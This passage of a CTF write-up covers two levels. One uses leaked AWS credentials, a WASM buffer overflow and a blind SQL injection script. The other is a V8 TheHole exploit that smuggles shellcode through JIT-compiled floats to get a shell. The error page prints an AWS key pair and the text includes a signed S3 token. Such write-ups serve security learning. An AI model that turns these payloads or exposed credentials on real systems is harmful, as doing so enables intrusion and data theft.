<pre>Error: /root/.aws/credentials:1:1<br> &nbsp;&gt; 1| [default]<br>-------^<br> &nbsp; &nbsp;2| aws_access_key_id = AKIAQYDFBGMSQ542KJ5Z<br> &nbsp; &nbsp;3| aws_secret_access_key = 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<br><br>unexpected text &quot;[defa&quot;<br> &nbsp; &nbsp;at makeError (/app/node_modules/pug-error/index.js:34:13)<br> &nbsp; &nbsp;at Lexer.error (/app/node_modules/pug-lexer/index.js:62:15)<br> &nbsp; &nbsp;at Lexer.fail (/app/node_modules/pug-lexer/index.js:1629:10)<br> &nbsp; &nbsp;at Lexer.advance (/app/node_modules/pug-lexer/index.js:1694:12)<br> &nbsp; &nbsp;at Lexer.callLexerFunction (/app/node_modules/pug-lexer/index.js:1647:23)<br> &nbsp; &nbsp;at Lexer.getTokens (/app/node_modules/pug-lexer/index.js:1706:12)<br> &nbsp; &nbsp;at lex (/app/node_modules/pug-lexer/index.js:12:42)<br> &nbsp; &nbsp;at Object.lex (/app/node_modules/pug/lib/index.js:104:9)<br> &nbsp; &nbsp;at Function.loadString [as string] (/app/node_modules/pug-load/index.js:53:24)<br> &nbsp; &nbsp;at compileBody (/app/node_modules/pug/lib/index.js:82:18)</pre>
</body>
</html>
```

With these credentials, we are able to interact with the server using the `aws` cli command. By using the credentials obtained to configure our aws settings, we are able to run some functions on the server to enumerate it. 

```sh
level-8 ➜ aws lambda list-functions

An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:aws:iam::051751498533:user/blind_sql_injection-challenger is not authorized to perform: lambda:ListFunctions on resource: * because no identity-based policy allows the lambda:ListFunctions action
```

First, I tried to list the available functions on the server, but we are not authorized to perform those actions with our current credentials. However, after taking a look at `server.js` again, we can see that there is a function in particular that we are looking for , which is `craft_query`. 

```js
    try {
        lambda.invoke({
            FunctionName: 'craft_query',
            Payload: payload
        }, (err, data) => {
```

Therefore, I tried to get the function information directly instead, and it worked. 

```sh
level-8 ➜ aws lambda get-function --function-name craft_query
{
    "Configuration": {
        "FunctionName": "craft_query",
        "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:craft_query",
        "Runtime": "nodejs18.x",
        "Role": "arn:aws:iam::051751498533:role/tisc23_ctf_sg-prod20230727104447843500000001",
        "Handler": "index.handler",
        "CodeSize": 27109,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-10-01T10:53:16.000+0000",
        "CodeSha256": "TUzKimM9d5GavjF4ZARnrmzYL1zUQO97X2Ld+X69lm0=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "12d812c6-2d4c-461c-b1a8-e61e5fc0863b",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ]
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/craft_query-a989953b-8c24-41f0-ac22-813b4ca32bbc?versionId=JNLr5qtX.LFHg63fpryY.eZVBru5aTvH&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBoaDmFwLXNvdXRoZWFzdC0xIkYwRAIgBHFc28aFIlzvoL24t4kwTKQB5JvG3UMPWtizbHNhHmICIHd6JvspQ9OcVmuhe07exw3KbpmYaSJLr%2FlU46A3revXKr8FCCMQBBoMMjk1MzM4NzAzNTgzIgyGFTuBCWxcCPkOWhEqnAWMc5a1SWL%2FofDnK3hEXLX%2F3f9nRjF2YI%2B9UHs8Eq867W3t4n666%2FFNePN0Ht5ZMRO1OmlBB5SxEJu1aovX8O0m2w7oe0%2B39g%2BAb1x9c7scBsem4Q8D7%2Bd8Dn7CBPbZF9%2FtSP%2F7S1WwiEeQD3mxRXpMb8loBQ6qaZEnLbE2CFVKsmKPvKIwtwMZhWwMTjr3hn6Dwjld2pcAObfQ8OHQ6o0wb393UaMJ5H0m%2Bkz0pWh0Nev6I5AdM8RJ6TRUOftjmbHS27V3PQx%2BeIMIyclfoptCdmlt9Y9K8LjAB1bIYEgjzCMLx4PgLU47En5o9ZOhc5afGOmshQbPoc6FEMVWty8KTM1SFZr6auihv9LX6IKILdhhRxeLVoDMLRGf6C4Hu9y7W%2FFAzYmQ8%2BW2lXAt41w31Oc9SqsF3qelyiGH920OZ3FQdpfCDwxuWumdNiR%2B0OWgei1q81jhAa1RnQ1EsnKlB63IzLz22FEjiQ1bEcsn1dAdJOheCFRnED8wA7ipbBUWHzpDTSufhseNeLcMafVGzGskIOV6k1GxWbPOQJfXgxDnQvdQZWZKvkwv658foqE%2B5HxHnNY2k%2Fb8BA7hGBNEFJ67rqVmp3nOt6CNzyPNPblIolRQKKeLrkaKQ8hqYWYWsLlpRvD9N254HA0ooj9defLPcI2iZMLFvVbyfKRLrmedo8XVJPVaA6lnkYg8wwlAQvkDYsjsmH1EaQB8TL6n1ZabxT1wEUOzP9nYTQpgsPZlFypeHnoMy46kotPBGSZIgzzW0UGZnHaCNuuCWpCvq3BQV%2FSqc6%2Fj1Qg2ktSb1EChaO6C4MJVfsZBr28rQHvhk3UZ74xJDwLnxqUuGJM4Y8S%2FpAQIsNisJovEm%2BYwzEyDAeAdSOE%2Btd56RTCX8e2oBjqyAVlRyCWcbGsulX2ytDxVnNCodB8n5gbO5pYP2bRnC%2B%2FUa29%2FfSWYhACwzyRvF6YjWWuSOQjXYfoi5nobRrPKREKd0%2BgBuaeUKLOag7wTXaKfUq9NuHquQ1Pn5Hd%2B%2BCr30a3Kqm1Z9ei4jVp94SlRLTV%2ByyjpA9w%2FRJWFc1xsTc3eqIm76nUK6aPCEVZVKz0IJGSzQ2E4RBzAumD%2FhUlHb2wpDJSWgZ61OeeDrYe3uvVQLdg%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20231003T034718Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LPQUL7OMPN%2F20231003%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=01e7ce40803884943eb2e8fddf67f3e56801e1ae7ba2bf684f211ebe350c85ec"
    },
    "Tags": {
        "Project": "tisc23.ctf.sg",
        "Owner": "kennethtan",
        "ProvisionedBy": "terraform",
        "Region": "ap-southeast-1",
        "Env": "prod"
    }
}
```

By clicking on the link, I was able to download a `craft_query.zip` file which contained 3 files, `index.js`, `site.js` and `site.wasm`.

After looking at `index.js`, we can see that it exports a function from the wasm module called `craft_query` that takes in two strings as parameters, presumably the username and password, and returns a string which is the query.

```js
async function initializeModule() {
    return new Promise((resolve, reject) => {
        EmscriptenModule.onRuntimeInitialized = () => {
            const CraftQuery = EmscriptenModule.cwrap('craft_query', 'string', ['string', 'string']);
            resolve(CraftQuery);
        };
    });
}
```

### WASM Exploit
Based on the above information, I started to look at the `site.wasm` file.

Opening `site.wasm` in JEB, I was better able to understand what the `craft_query` function was doing. In the initial analysis, we can see that it calls 2 functions, then passes the `username` and `password` string to the functions respectively.

![call-indirect](level-8/image-1.png)

Afterwards, we can see that it uses the `call_indirect` function call. Generally, `call_indirect` is used to call functions based on their index in the function table. In this case, `call_indirect` was used to call the `is_blacklisted` function based on the function table below.

![function-table](level-8/image.png)

In order to figure out how the `craft_query` function works, I modified the `index.js` file to conduct some local testing to my inputs and the return value.

With this, I managed to guess that maybe the `craft_query` function first copies the `username` and `password` string to the stack. Then the function `is_blacklisted` is called to check if there are any disallowed characters, and if it passes the check, the SQL query with the username and password is returned by calling the `load_query` function from`is_blacklisted` function. 

Well, the next question would be whether there is a way to bypass the `is_blacklisted` function so that I can perform SQL Injection through the username and password input without getting blacklisted?

Since this challenge was also categorized as Pwn, I also began reading up on different WASM exploits and played around with my `username` and `password` inputs during local testing. Eventually, I realised that once my `username` input exceeded a certain length, the program would crash and return an error.

![table-out-of-bounds](level-8/image-2.png)

This led me to further believe that the `username` and `password` strings were being copied to the stack, and might have caused a buffer overflow which overwrote important stuff on the stack.

After reading this [article](https://blog.protekkt.com/blog/basic-webassembly-buffer-overflow-exploitation-example), I gained a better understanding of how the crash happened. Perhaps during the buffer overflow, I might've overwritten the function table index used to call `is_blacklisted`, resulting it an out of bounds table index.

I attempted to follow the writeup and overwrite the function table index on the stack, so that the `load_query` function would be called instead of `is_blacklisted`, which allows us to bypass the check for blacklisted characters. 

With this, I was able to move on the last part, which is performing SQL injection to get the flag.

### SQL Injection

To test if an SQL Injection would work, I first tried a generic query to login without the use of credentials.

From the `db-init.sql` file, we can see that the flag is stored as the admin user's password.

```sql
CREATE TABLE IF NOT EXISTS Users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(255) NOT NULL UNIQUE,
  password VARCHAR(255) NOT NULL
);

INSERT INTO Users (username, password) VALUES ('admin', 'TISC{n0t_th3_fl4g}');
INSERT INTO Users (username, password) VALUES ('bobby', 'password');
```

With this information, the first thing that comes to mind would be error-based blind SQL injection, where I would be able to write a script to bruteforce each letter in the password to ultimately get the full password. 

I started by testing and crafting queries till I found one that worked, then scripted it to get the full flag.

With my original query, I got a flag that seemed correct, but was wrong upon submission, and I realised that the query I had was not case-sensitive. 

_insert facepalm_

![wrong-flag](level-8/image4.png)

But after reading up on SQL queries and wondering why my query was not case-sensitive despite using `SUBSTRING` which is supposed to be case-sensitive, I found the culprit! The `=` sign used to match `SUBSTRING` to the character used to bruteforce was not case-sensitive, and the issue could be solved by checking that the `BINARY` value of both characters are the same instead.

```py
import requests
import string
url = "http://chals.tisc23.ctf.sg:28471/api/login"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

flag = 'TISC{'
i = len(flag) + 1

while True:
    for c in string.printable:
        data = {
            'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x02',
            'password': f'"OR SUBSTRING(password, 1, {i}) = BINARY "{flag+c}'
        }
        r = requests.post(url, headers=headers, data=data)

        if ("Welcome" in r.text):
            flag += c
            i += 1
            print(flag)
            break

    if c == "}":
        break

print("flag: " + flag)
```
After awhile, I got the flag :D

![flag-8](level-8/image-3.png)


## Level 9 - PalinChrome
In this level, we were given 4 files, `snapshot_blob.bin`, `build.Dockerfile`, `d9.patch` and `d8`. 

From the given challenge context, we can know that this challenge is related to some form of browser exploit in a javascript engine. So I first read up on Chrome Browser Exploits to figure out roughly what I was working with.

I then took a look at the `d9.patch` file. It contains information on code that was edited in the javascript engine. 

```diff
diff --git a/src/builtins/builtins-object.cc b/src/builtins/builtins-object.cc
index e6d26ef7c7..279a6b7c4d 100644
--- a/src/builtins/builtins-object.cc
+++ b/src/builtins/builtins-object.cc
@@ -367,5 +367,10 @@ BUILTIN(ObjectSeal) {
   return *object;
 }

+BUILTIN(ObjectLeakHole){
+  HandleScope scope(isolate);
+  return ReadOnlyRoots(isolate).the_hole_value();
+}
+
 }  // namespace internal
 }  // namespace v8

diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 8a81c4acda..0e87f71473 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1604,6 +1604,9 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
     SimpleInstallFunction(isolate_, object_function, "seal",
                           Builtin::kObjectSeal, 1, false);

+    SimpleInstallFunction(isolate_, object_function, "leakHole",
+                          Builtin::kObjectLeakHole, 0, false);
+
     SimpleInstallFunction(isolate_, object_function, "create",
                           Builtin::kObjectCreate, 2, false);
```

From this code block, we can see that an object function, `leakHole` was introduced to the engine. This provided more context as to what I should look out for when reading up Chrome Browser Exploits. By searching leak hole and chrome browser exploits, I came across this [article](https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/).

This article touched on how `TheHole` value can be exploited to achieve remote code execution. It is a detailed walkthrough of a vulnerability that leveraged `TheHole` value, which is what we are working with. The most relevant part would be the exploitation of `TheHole` value after leaking it as we are directly provided the value in this challenge. 

However, the technique used to exploit `TheHole` in the above article was patched in the engine that we are working with. Therefore, we would have to find another exploit that leverages `TheHole` value, but is not patched in the current version of the engine.

![engine-version](level-9/image.png)

This led me to invest a lot of time into researching and finding other exploit techniques for the hole. I stumbled upon the write ups and POCs for 2 CVEs:

- [CVE-2023-2033](https://github.com/mistymntncop/CVE-2023-2033/blob/main/exploit.js)

- [CVE-2023-3079](https://github.com/mistymntncop/CVE-2023-3079/blob/main/exploit.js)

In both of these CVEs, the technique used to exploit `TheHole` value is the same. 

When I tried to adapt the exploit technique to our `d8` binary, it didn't seem to work as there were some errors. Even after trying to fix the syntax errors, the leaks were still showing up as `0`.

In order to find out how to fix the POC, if the technique wasn't already patched yet, I had to first understand roughly how the more relevant parts of the exploit worked.

>     1) https://bugs.chromium.org/p/chromium/issues/detail?id=1445008
>     "Currently the_hole is an Oddball object (like 'null', 'undefined', 'true', 'false') and therefore looks like a
>     valid JSObject. For that reason, operations like ToNumber are currently possible for the_hole (and result in NaN).
>     The fact that this is possible by accident has led to issues with Turbofan's Typer, allowing an attacker to cause
>     mistyping in the JIT and subsequently memory corruption."

In this excerpt from `CVE-2023-2033`, it explains how there is a bug in the Turbofan engine and how they use the JIT compilation generated by the Turbofan engine to cause memory corruption. 

Since I am not familiar with what Turbofan or JIT compilation is, I had to do some research to find out more about it. I read some writeups on exploitation in the v8 Turbofan engine, as well as what v8 JIT compilation is about.

From this [writeup](https://www.willsroot.io/2021/04/turboflan-picoctf-2021-writeup-v8.html) , we can see how the author seems to use a huge loop counter in order to trigger the JIT bug.

After reading a few more stack overflow posts [here](https://stackoverflow.com/questions/59807938/the-confusion-with-jit-compilation-in-v8) and [here](https://stackoverflow.com/questions/59809832/after-what-exact-number-of-execution-function-gets-hot-in-v8), I was able to understand that the Turbofan engine is in charge of optimizing code by compiling it when it is beneficial. The way that v8 decides whether it is optimal to compile a v8 function depends on the amount of time spent executing the unoptimized version of that function.

```c
// cve-2023-3079.js

function install_primitives() {

    for(let i = 0; i < 10; i++) {
        weak_fake_obj(true, 1.1);
    }
    for(let i = 0; i < 20000; i++) {
        weak_fake_obj(false, 1.1);
    }

    for(let i = 0; i < 1000; i++) {
        leak_stuff(true);
    }
    for(let i = 0; i < 20000; i++) {
        leak_stuff(false);
    }
    // ...
  }
```

This explains the huge loop counter in the writeup, as well as in our POC, which basically tries to run the function many many times until the Turbofan engine kicks in to optimize and JIT compile the relevant code.

If we look at these two functions, we can see that these are also the functions that tries to do stuff using the leaked hole, which is in line with the excerpt mentioned above. From this, we can understand that the POC primarily tries to trigger the exploit in the `leak_stuff` and `weak_fake_obj` functions, and these are also functions that require to be JIT compiled and optimized by turbofan.

```js
function leak_stuff(b) {
    if(b) {
        let index = Number(b ? the.hole : -1);
        index |= 0;
        index += 1;
        // ...
    }
}

function weak_fake_obj(b, addr=1.1) {
    if(b) {
        let index = Number(b ? the.hole : -1);
        index |= 0;
        index += 1;
        // ...
    }
}
```

If we run the POC again, with the flag `--trace-opt`, which traces functions that are optimized by our JIT compiler, we will see the following:

```
./d8 --trace-opt original_3079.js
[marking 0x196e00115ead <JSFunction install_primitives (sfi = 0x196e0011581d)> for optimization to TURBOFAN, ConcurrencyMode::kConcurrent, reason: hot and stable]
obj_addr = deadbee0
map = 0
```

As shown, the engine does not optimize the required functions, which is possibly a reason why the POC has failed. Therefore, I increased the loop count to try and see if it would cause the engine to optimize the functions.

```c
// cve-2023-3079.js

function install_primitives() {

    for(let i = 0; i < 10000; i++) {
        weak_fake_obj(true, 1.1);
    }
    for(let i = 0; i < 20000; i++) {
        weak_fake_obj(false, 1.1);
    }

    for(let i = 0; i < 10000; i++) {
        leak_stuff(true);
    }
    for(let i = 0; i < 20000; i++) {
        leak_stuff(false);
    }
    // ...
  }
```

```
level-9 ➜ ./d8 --trace-opt 3079.js
[marking 0x24c000115cd9 <JSFunction weak_fake_obj (sfi = 0x24c00011568d)> for optimization to TURBOFAN, ConcurrencyMode::kConcurrent, reason: hot and stable]
[compiling method 0x24c000115cd9 <JSFunction weak_fake_obj (sfi = 0x24c00011568d)> (target TURBOFAN), mode: ConcurrencyMode::kConcurrent]
[completed compiling 0x24c000115cd9 <JSFunction weak_fake_obj (sfi = 0x24c00011568d)> (target TURBOFAN) - took 0.046, 1.630, 0.022 ms]
[completed optimizing 0x24c000115cd9 <JSFunction weak_fake_obj (sfi = 0x24c00011568d)> (target TURBOFAN)]
[marking 0x24c000115ddd <JSFunction install_primitives (sfi = 0x24c000115791)> for optimization to TURBOFAN, ConcurrencyMode::kConcurrent, reason: hot and stable]
[marking 0x24c000115ca5 <JSFunction leak_stuff (sfi = 0x24c000115659)> for optimization to TURBOFAN, ConcurrencyMode::kConcurrent, reason: hot and stable]
[compiling method 0x24c000115ca5 <JSFunction leak_stuff (sfi = 0x24c000115659)> (target TURBOFAN), mode: ConcurrencyMode::kConcurrent]
[completed compiling 0x24c000115ca5 <JSFunction leak_stuff (sfi = 0x24c000115659)> (target TURBOFAN) - took 0.006, 2.402, 0.020 ms]
[completed optimizing 0x24c000115ca5 <JSFunction leak_stuff (sfi = 0x24c000115659)> (target TURBOFAN)]
obj_addr = 1c25c1
map = 10306d
```

aaaaaaaaaaaaaaand it worked! But we are not done as this POC only implements the arbitrary read and write functions in `v8_read64` and `v8_write64`. I would ultimately still need to get a shell in order to read the flag from the system.

So I did a bit more research to see if there were any CTF write ups that I could use as reference, and I came across this [write up](https://chovid99.github.io/posts/hitcon-ctf-2022/). 

This write up implements the entire exploit, but the only relevant part is where the script leverages the arbitrary read and write functions to gain shell access to the remote system. 

It implements a function that places shellcode in RWX memory by JIT compiling a function that returns a float array and smuggling the shellcode instructions as the float values. We can simply copy the relevant parts of the code, rename the functions, and fix any broken offsets afterwards.

```js
const foo = ()=>
{
    return [1.0,
        1.95538254221075331056310651818E-246,
        1.95606125582421466942709801013E-246,
        1.99957147195425773436923756715E-246,
        1.95337673326740932133292175341E-246,
        2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {foo();foo();foo();foo();}

f_code = v8_read64(addr_of(foo)+0x18n) & ((1n << 32n) - 1n);
f_code_code_entry_point = v8_read64(f_code+0xcn);
v8_write64(f_code+0xcn, f_code_code_entry_point+124n);
foo();
```

At this point, if we run the payload, it fails to work. In order to debug this, we can follow the steps taken in the writeup to check if the offsets are correct. This will require us to compile a debug build of `d8` so that we can get more verbose debug output when we call `%DebugPrint`. Following the writeup, we can also use the `job` command in GDB by loading the GDB scripts in `build/tools` into GDB.

Apart from changing `is_debug` to `true`, we will also have to disable `dcheck` by following [this](https://v8-users.narkive.com/HDDkEOae/how-to-off-dcheck), which would otherwise cause `d8` to keep terminating whenever it tries to do stuff with the hole. 

By following the steps taken in the writeup, we can note that some offsets are different. For example, as shown below, our `code_entry_point` is at an offset of `code+0x10n` instead of `0xc`.

```
pwndbg> x/20wx 0x30840025539d-1
0x30840025539c: 0x00002a71      0x000023e1      0xc0004001      0x00007f81
0x3084002553ac: 0xc0004040      0x00007f81      0xffff001d      0x00000004
0x3084002553bc: 0x00002231      0x0000004e      0x00255461      0x00000002
0x3084002553cc: 0x00255505      0x00000066      0x0000007c      0x00000000
0x3084002553dc: 0x00254fe5      0x00255521      0x0000089a      0x00000008

pwndbg> job 0x30840025539d
0x30840025539d: [CodeDataContainer] in OldSpace
 - map: 0x308400002a71 <Map[32](CODE_DATA_CONTAINER_TYPE)>
 - kind: TURBOFAN
 - is_off_heap_trampoline: 0
 - code: 0x7f81c0004001 <Code TURBOFAN>
 - code_entry_point: 0x7f81c0004040
 - kind_specific_flags: 4
```

We also have to modify the offset from the `code_entry_point` to the smuggled shellcode, by making the calculations in GDB.

```
pwndbg> x/30i 0x556820004040
   0x556820004040:      mov    ebx,DWORD PTR [rcx-0x30]
   0x556820004043:      add    rbx,r14
   0x556820004046:      test   BYTE PTR [rbx+0x1b],0x1
   0x55682000404a:      je     0x556820004051
   0x55682000404c:      jmp    0x55683fe8d1c0
   0x556820004051:      push   rbp
   0x556820004052:      mov    rbp,rsp
   0x556820004055:      push   rsi
   0x556820004056:      push   rdi
   0x556820004057:      push   rax
   0x556820004058:      sub    rsp,0x8
   0x55682000405c:      cmp    rsp,QWORD PTR [r13+0x20]
   0x556820004060:      jbe    0x556820004161
   0x556820004066:      mov    rcx,QWORD PTR [r13+0xce30]
   0x55682000406d:      lea    rdi,[rcx+0x48]
   0x556820004071:      cmp    QWORD PTR [r13+0xce38],rdi
   0x556820004078:      jbe    0x556820004191
   0x55682000407e:      lea    rdi,[rcx+0x38]
   0x556820004082:      mov    QWORD PTR [r13+0xce30],rdi
   0x556820004089:      add    rcx,0x1
   0x55682000408d:      mov    r8,QWORD PTR [r13+0x288]
   0x556820004094:      mov    DWORD PTR [rcx-0x1],r8d
   0x556820004098:      mov    DWORD PTR [rcx+0x3],0xc
   0x55682000409f:      vpcmpeqd xmm0,xmm0,xmm0
   0x5568200040a3:      vpsllq xmm0,xmm0,0x36
   0x5568200040a8:      vpsrlq xmm0,xmm0,0x2
   0x5568200040ad:      vmovsd QWORD PTR [rcx+0x7],xmm0
   0x5568200040b2:      movabs r10,0xceb580068732f68    // <-- smuggled shellcode is here +2
   ...
pwndbg> pi 0x5568200040b2-0x556820004040+2
116
```

and we get our shell :D

![flag-9](level-9/image-1.png)